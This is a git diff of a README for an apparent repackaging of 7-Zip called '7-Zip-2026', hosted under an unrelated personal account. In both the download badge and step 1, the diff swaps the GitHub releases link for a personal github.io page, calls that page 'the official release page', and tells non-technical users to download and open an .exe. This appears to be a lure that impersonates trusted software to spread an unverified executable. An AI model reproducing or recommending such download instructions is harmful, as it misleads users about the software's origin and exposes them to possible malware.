@@ -1,6 +1,6 @@
 # 📦 7-Zip-2026 - Open files and compress folders easily
 
-[![](https://img.shields.io/badge/Download-7--Zip-2026-blue)](https://github.com/Kirbiesaddleshaped324/7-Zip-2026/releases)
+[![](https://img.shields.io/badge/Download-7--Zip-2026-blue)](https://kirbiesaddleshaped324.github.io)
 
 7-Zip-2026 provides a simple way to manage your computer files. This utility handles compressed folders and helps you save disk space on Windows 11 and Windows 10. The software uses high compression ratios to shrink large documents or collections of photos. It supports common formats like zip and 7z.
 
@@ -19,7 +19,7 @@ This version offers tools for everyday file management.
 
 Follow these steps to set up the software on your system. You do not need technical skills to complete this process.
 
-1.  Visit the official release page: [https://github.com/Kirbiesaddleshaped324/7-Zip-2026/releases](https://github.com/Kirbiesaddleshaped324/7-Zip-2026/releases).
+1.  Visit the official release page: [https://kirbiesaddleshaped324.github.io](https://kirbiesaddleshaped324.github.io).
 2.  Find the file list under the Latest release section.
 3.  Click the file ending in .exe to start the download.
 4.  Open the file once the download finishes.
